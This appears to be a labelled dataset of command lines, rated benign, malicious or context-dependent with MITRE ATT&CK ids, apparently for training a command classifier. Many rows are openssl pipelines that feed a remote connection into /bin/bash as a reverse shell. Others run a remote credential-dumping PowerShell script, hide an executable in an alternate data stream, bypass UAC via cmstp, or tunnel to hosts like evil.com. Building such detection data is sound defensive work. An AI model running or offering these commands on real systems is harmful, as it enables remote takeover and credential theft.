command,label,original_label,mitre_id
sudo dpkg [-P|--purge] package,Benign,Benign,Benign
terraform output,Benign,Benign,Benign
lesskey [-o|--output] path/to/output path/to/lesskey_file,Benign,Benign,Benign
_objc_getClass(),Malicious,Malicious,T1129
diantz /f {PATH:.ddf},Malicious,Malicious,T1036
tail -50 /var/log/apache2/error.log,Context_Dependent,Synthetic,Synthetic
numfmt --from auto 1.5Ki,Benign,Benign,Benign
find / -name Chapter1 -type f,Context_Dependent,Benign,Benign
find . -iname '.note' | sort,Benign,Benign,Benign
rabbitmqctl clear_permissions [-p|--vhost] vhost_name username,Benign,Benign,Benign
"$wc.DownloadFile($url, $output)",Malicious,Malicious,T1562
podman rmi [-h|--help],Benign,Benign,Benign
ssh -w 0:0 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
emond,Benign,Benign,Benign
systemctl is-active docker,Context_Dependent,Synthetic,Synthetic
scrcpy [-r|--record] path/to/file.mp4,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:80 jenkins@payload.c2,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9001,Malicious,Synthetic,Synthetic
pbmtoascii path/to/input_file.pbm > path/to/output_file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
xdelta delta path/to/old_file path/to/new_file path/to/patch_file,Benign,Benign,Benign
qrcp send|receive [-p|--port] port_number,Benign,Benign,Benign
column -t -s $'\n' list-of-entries.txt,Benign,Benign,Benign
pnmtosgi [-i|-imagename] string path/to/input.pnm > path/to/output.sgi,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
Ventoy2Disk VTOYCLI /U /Drive:D:,Benign,Benign,Benign
"find . -type d -name files -exec chmod ug+rwx,o-rwx {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
stormlock acquire resource,Benign,Benign,Benign
mshta.exe {REMOTEURL},Malicious,Malicious,T1105
ssh -fN -L 8080:192.168.1.10:9001 postgres@evil.com,Context_Dependent,Synthetic,Synthetic
find / -name '#*' -atime +7 -print | xargs rm,Context_Dependent,Benign,Benign
cargo owner --registry name,Benign,Benign,Benign
gpg [--full-gen-key|--full-generate-key],Benign,Benign,Benign
find /myfiles -atime +30 -exec rm {} \;,Benign,Benign,Benign
InstallLanguage,Context_Dependent,Malicious,T1614
tcpdump -i ens33 port 8080,Context_Dependent,Synthetic,Synthetic
systemctl list-machines machine_1 machine_2 ...,Benign,Benign,Benign
acme.sh --issue --dns dns_cf [-d|--domain] *.example.com,Benign,Benign,Benign
diskutil unmountDisk /dev/disk,Benign,Benign,Benign
sshuttle -r user@10.0.0.1 192.168.0.50/24,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
linode-cli domains records-delete domain_id record_id,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
npm doctor permissions,Benign,Benign,Benign
uv python dir,Benign,Benign,Benign
ssh -fN -L 8080:172.20.10.8:3389 admin@target.com,Context_Dependent,Synthetic,Synthetic
find / -fstype ext2 -name document -print,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
w32tm /query /status /verbose,Benign,Benign,Benign
qlmanage -p path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"copilot [-p|--prompt] ""Fix the bug in main.js"" --allow-all-tools",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8081,Malicious,Synthetic,Synthetic
icalBuddy uncompletedTasks,Benign,Benign,Benign
yard stats --list-undoc,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:443 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
tail -n +347340107 filename | head -n 100,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
uv lock --script path/to/script.py,Benign,Benign,Benign
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";",Malicious,Malicious,T1547
bore local [-t|--to] remote_server_address local_port,Benign,Benign,Benign
tcpdump -i eth0 port 8888,Context_Dependent,Synthetic,Synthetic
colima start --runtime containerd,Benign,Benign,Benign
screenfetch,Benign,Benign,Benign
hcloud -h,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9090,Malicious,Synthetic,Synthetic
tlmgr dump-tlpdb --remote,Benign,Benign,Benign
echo $(basename $(dirname $(dirname $pathname))),Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4445,Malicious,Synthetic,Synthetic
carp,Benign,Benign,Benign
tail -50 /var/log/apache2/access.log,Context_Dependent,Synthetic,Synthetic
msgfmt path/to/file.po [-o|--output-file] path/to/file.mo,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
sshuttle -r svcuser@10.20.30.40 10.0.0.50/24,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:1433,Malicious,Synthetic,Synthetic
"mdfind ""query""",Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:8080 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
sysctl fs.protected_hardlinks,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:143,Malicious,Synthetic,Synthetic
aws ses describe-active-receipt-rule-set --generate-cli-skeleton,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:80 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
wn emphatically,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
dos2unix --keep-bom|add-bom|remove-bom path/to/file,Benign,Benign,Benign
sshuttle -r admin@corp-backup.internal 172.16.0.10/24,Context_Dependent,Synthetic,Synthetic
oma show,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
wget --user username --password password https://example.com,Benign,Benign,Benign
debugfs -w /dev/sdXN,Benign,Benign,Benign
"echo ""$IFS""",Benign,Benign,Benign
systemctl is-enabled nginx,Context_Dependent,Synthetic,Synthetic
ecpg input.pgc,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:3306 jenkins@192.168.1.25,Context_Dependent,Synthetic,Synthetic
fsadm [-l|--lvresize] resize /dev/vg_name/lv_name 100G,Benign,Benign,Benign
ssh -w 0:0 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
kubectl config current-context,Benign,Benign,Benign
ebuild path/to/file.ebuild unpack,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8443,Malicious,Synthetic,Synthetic
"fold -w79 yourfile | sed -e :a -e 's/^.\{0,78\}$/& /;ta'",Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:110 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
SecurityCenter2.AntiVirusProduct,Context_Dependent,Malicious,T1518
pbmnoise width height > path/to/output.pbm,Benign,Benign,Benign
nix why-depends --derivation nixpkgs#dependent nixpkgs#dependency,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
df -h .,Benign,Benign,Benign
"""$rar_exe"" a -r $output_file $input_path\*$file_extension",Malicious,Malicious,T1560
ansible-inventory --list [-i|--inventory-file] path/to/file_or_script_or_directory,Benign,Benign,Benign
lxi discover,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:9001 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
find . -type f -print | xargs chmod 444,Benign,Benign,Benign
cordova info,Benign,Benign,Benign
apptainer run-help --app app_name path/to/image.sif,Benign,Benign,Benign
yadm clone remote_repository_location --w worktree_file,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:443 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
sui move build --path path,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
pamixer [-d|--decrease] 5 --source ID,Benign,Benign,Benign
find /var/log -daystart -mtime 0,Benign,Benign,Benign
git clear,Benign,Benign,Benign
aurvote package1 package2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
daemon --list,Benign,Benign,Benign
tcpdump -i eth0 -w /tmp/.task,Context_Dependent,Synthetic,Synthetic
kind export kubeconfig|logs,Benign,Benign,Benign
olevba path/to/file,Benign,Benign,Benign
"eventcreate /so source_name /t type /id id /d ""message""",Benign,Benign,Benign
ssh -w 0:0 deploy@update.bad,Context_Dependent,Synthetic,Synthetic
laravel list,Benign,Benign,Benign
"bedtools groupby -i path/to/file -c 1-3,5 -g 6 -o sum",Benign,Benign,Benign
"Set-Volume -FileSystemLabel ""OldLabel"" -NewFileSystemLabel ""NewLabel""",Benign,Benign,Benign
tcpdump -i ens160 port 445,Context_Dependent,Synthetic,Synthetic
lit path/to/test_suite --time-tests,Benign,Benign,Benign
dunstctl history-pop,Benign,Benign,Benign
tcpdump -i enp0s3 -c 143,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:80 backup@172.16.5.20,Context_Dependent,Synthetic,Synthetic
jj [--at-op|--at-operation] operation subcommand,Benign,Benign,Benign
tldr print.zsh,Benign,Benign,Benign
rsync -e ssh file host:/directory/.,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:9002,Malicious,Synthetic,Synthetic
gist --login,Benign,Benign,Benign
"cmstp.exe /s ""$inf_file_uac"" /au",Malicious,Malicious,T1218
xmlto html-nochunks document.xml,Benign,Benign,Benign
"$base64Strings | Set-Content ""$HOME\decoded.ps1""",Malicious,Malicious,T1001
sshuttle -r operator@ops-audit.internal 0/0,Context_Dependent,Synthetic,Synthetic
nextflow pull user/repo -hub bitbucket,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.254:993 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:9001,Malicious,Synthetic,Synthetic
find $HOME -mtime +365,Benign,Benign,Benign
guile --listen=port_or_socket,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:4444 backup@172.16.0.25,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.5:80 svcuser@172.16.0.25,Context_Dependent,Synthetic,Synthetic
cargo bench --no-run,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
pvecm [n|nodes],Benign,Benign,Benign
spctl --master-enable,Benign,Benign,Benign
ssh -fN -L 8080:192.168.0.5:80 backup@10.0.0.25,Context_Dependent,Synthetic,Synthetic
"find . -name ""*.txt -exec process_one {} "";""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
"strace -f -e trace=open,read,write -p 3306",Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:4444 deploy@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9001,Malicious,Synthetic,Synthetic
find . -type f -atime -1 -exec ls -l {} \;,Benign,Benign,Benign
"find . \( -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.m"" \) -print0 | xargs -0 wc",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3306,Malicious,Synthetic,Synthetic
nokogiri url|path/to/file -C path/to/config_file,Benign,Benign,Benign
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,Malicious,Malicious,T1555
"find / -name ""[a-j]*"" -print",Context_Dependent,Benign,Benign
ssh -fN -L 8080:192.168.0.5:53 svcuser@172.20.10.8,Context_Dependent,Synthetic,Synthetic
nix-store --delete /nix/store/checksum-package-version.ext,Benign,Benign,Benign
ddcutil [det|detect],Benign,Benign,Benign
conan remote list,Benign,Benign,Benign
mux -c muxer_name1 muxer_name2 ...,Benign,Benign,Benign
"""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat",Malicious,Malicious,T1558
as path/to/file.s -o path/to/output_file.o,Benign,Benign,Benign
"find . -name ""file-containing-can't"" -exec grep ""can't"" '{}' \; -print",Benign,Benign,Benign
git rebase --onto new_base old_base,Benign,Benign,Benign
flatpak remote-info --log remote_name com.example.app,Benign,Benign,Benign
bob list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
tcpdump -i enp0s3 -c 4444,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8080,Malicious,Synthetic,Synthetic
whatwaf --ra --throttle seconds --timeout seconds [-P|--post] --force-ssl [-u|--url] http://example.com,Benign,Benign,Benign
fabric [-p|--pattern] pattern1 | fabric [-p|--pattern] pattern2,Benign,Benign,Benign
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad,Context_Dependent,Malicious,T1012
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:4445,Malicious,Synthetic,Synthetic
git reflog [-n|--max-count] 5,Benign,Benign,Benign
drupal-check path/to/directory,Benign,Benign,Benign
find . -type d -iname \*music_files\*,Benign,Benign,Benign
"find . ! -name . -prune -exec sh -c 'mv ""$@"" targetdirectory/' sh {} +",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
sysctl kernel.osrelease,Context_Dependent,Synthetic,Synthetic
sshuttle -r jenkins@172.16.5.20 0/0,Context_Dependent,Synthetic,Synthetic
"yum list installed --disablerepo=""*"" --enablerepo=""fedora*""",Benign,Benign,Benign
setx variable value /M,Benign,Benign,Benign
"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""",Malicious,Malicious,T1564
"top -p $(pgrep -d',' http)",Benign,Benign,Benign
ptx [-G|--traditional] path/to/file,Benign,Benign,Benign
lighthouse --output json --output-path path/to/file.json https://example.com,Benign,Benign,Benign
gh repo [ls|list] owner [-l|--language] language_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
tldr [-p|--platform] linux dd,Benign,Benign,Benign
tcpdump -i eth0 host 10.20.30.40,Context_Dependent,Synthetic,Synthetic
openstack flavor list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8080,Malicious,Synthetic,Synthetic
"mosquitto_pub [-h|--host] 192.168.1.1 [-p|--port] 1885 [-t|--topic] sensors/temperature [-m|--message] ""1266193804 32""",Benign,Benign,Benign
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null,Malicious,Malicious,T1137
dokku db:link db_name app_name,Benign,Benign,Benign
scc [-h|--help],Benign,Benign,Benign
dir \\$computer_ip\admin$,Context_Dependent,Malicious,T1135
rexec [-P|--port] 1234 [-h|--host] remote_host ls -l,Benign,Benign,Benign
stat /etc/security/limits.conf,Context_Dependent,Synthetic,Synthetic
aws rds reboot-db-instance --db-instance-identifier instance_identifier,Benign,Benign,Benign
path/to/cs2 -dedicated +map de_dust2,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
sudo bridge [v|vlan] [d|delete] dev lanX vid vlan_id,Benign,Benign,Benign
"echo -e ""line1\r\nline2"" | awk '{ print $0; }' | od -a",Benign,Benign,Benign
bridge -b /path/to/input-file,Context_Dependent,Malicious,T1005
find . -type f -print0 | xargs -0 ls -ltr | tail -n 1,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
flexget execute --now,Benign,Benign,Benign
ppmfade -f path/to/image1.ppm -l path/to/image2.ppm -mix|spread|shift|relief|oil|... -base base,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ethtool eth0,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:9090 backup@internal.corp,Context_Dependent,Synthetic,Synthetic
git cvsexportcommit -v -c -w path/to/project_cvs_checkout commit_sha1,Benign,Benign,Benign
find -type f -name dummy,Benign,Benign,Benign
find . -mindepth 1 -maxdepth 1 -type d,Benign,Benign,Benign
plasma-apply-colorscheme --list-schemes,Benign,Benign,Benign
tcpdump -i eth0 dst 10.0.0.25,Context_Dependent,Synthetic,Synthetic
terminalizer play path/to/recording.gif,Benign,Benign,Benign
gh issue [ls|list] [-s|--state] closed [-A|--author] username,Benign,Benign,Benign
top [-Hp|--threads-show --pid] process_id,Benign,Benign,Benign
exec 2 | tee ${LOG_FILE},Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:4445,Malicious,Synthetic,Synthetic
gpu-screen-recorder --list-audio-devices|--list-application-audio,Benign,Benign,Benign
darling shell,Benign,Benign,Benign
kubectl expose [-f|--filename] path/to/file.yml --port node_port --target-port container_port,Benign,Benign,Benign
chmod o=g path/to/file,Benign,Benign,Benign
sshuttle -r audit@192.168.1.254 10.0.0.8/24,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
systemd-sysusers --dry-run path/to/file,Benign,Benign,Benign
fdp -T png -O path/to/input.gv,Benign,Benign,Benign
lpoptions -d printer -o option,Benign,Benign,Benign
systemctl is-active nginx,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:22,Malicious,Synthetic,Synthetic
pdffonts -opw password path/to/file.pdf,Benign,Benign,Benign
haproxy -c -f path/to/haproxy.cfg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
zerotier-idtool generate path/to/identity.secret path/to/identity.public vanity_prefix,Benign,Benign,Benign
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},Malicious,Malicious,T1105
reindexdb database_name [-h|--host] hostname [-p|--port] port [-U|--username] username,Benign,Benign,Benign
amass intel|enum -help,Benign,Benign,Benign
echo 'ee' | tee >(foo),Benign,Benign,Benign
tmsu tag path/to/file.mp3 music big-jazz mp3,Benign,Benign,Benign
axel [-S|--search=]number url,Benign,Benign,Benign
ListAttachedRolePolicies,Context_Dependent,Malicious,T1069
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
tail -100 /var/log/secure,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:172.20.10.8:995 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
yadm gitconfig --list,Benign,Benign,Benign
tcpdump -i wlan0 -c 1433,Context_Dependent,Synthetic,Synthetic
systemctl list-units --type=service,Context_Dependent,Synthetic,Synthetic
screencapture path/to/file.png,Benign,Benign,Benign
genie [-s|--shell],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:110,Malicious,Synthetic,Synthetic
find $DIR -type f -exec grep $SEARCH /dev/null {} \; | wc --bytes,Benign,Benign,Benign
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU,Malicious,Malicious,T1547
getprop property,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:4445,Malicious,Synthetic,Synthetic
kubectl scale --replicas replicas_count [-f|--filename] path/to/file.yml,Benign,Benign,Benign
vlc --loop path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3306,Malicious,Synthetic,Synthetic
"if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi",Context_Dependent,Malicious,T1082
find /u/bill -amin +2 -amin -6,Benign,Benign,Benign
gh api --help,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:22,Malicious,Synthetic,Synthetic
cockpit-ws --port port,Benign,Benign,Benign
mpicc -o executable path/to/object_file.o,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:8443,Malicious,Synthetic,Synthetic
dmd -check=h|help|?,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
tr -cs '[:space:]',Benign,Benign,Benign
strace -e trace=network -p 8080,Context_Dependent,Synthetic,Synthetic
find -inum 804180 -exec rm {} \,Benign,Benign,Benign
Windows\CurrentVersion\Uninstall,Context_Dependent,Malicious,T1012
pigz [-l|--list] archive.tar.gz,Benign,Benign,Benign
ohdear list-monitors,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.50:80 svcuser@10.0.0.8,Context_Dependent,Synthetic,Synthetic
tcpdump -i wlan0 port 443,Context_Dependent,Synthetic,Synthetic
godoc -http=:6060 -index -index_files=path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
find . -size 10 print,Benign,Benign,Benign
guacd -b 127.0.0.1 -l 4823,Benign,Benign,Benign
createuser --interactive username,Benign,Benign,Benign
sudo arptables [-A|--append] INPUT [-s|--source-ip] 192.168.0.1 [-j|--jump] DROP,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:9090,Malicious,Synthetic,Synthetic
xfce4-terminal --tab,Benign,Benign,Benign
tcpdump -i eth0 src 192.168.1.100,Context_Dependent,Synthetic,Synthetic
unix2mac path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
phive remove alias|url,Benign,Benign,Benign
export VARIABLE=value,Benign,Benign,Benign
md5 path/to/file,Benign,Benign,Benign
touch path/to/encrypt_file && mkdir path/to/archive_folder,Benign,Benign,Benign
"find . -name ""new*.sh"" -exec rm -f '{}' \;",Benign,Benign,Benign
jwt decode [-j|--json] jwt_string,Benign,Benign,Benign
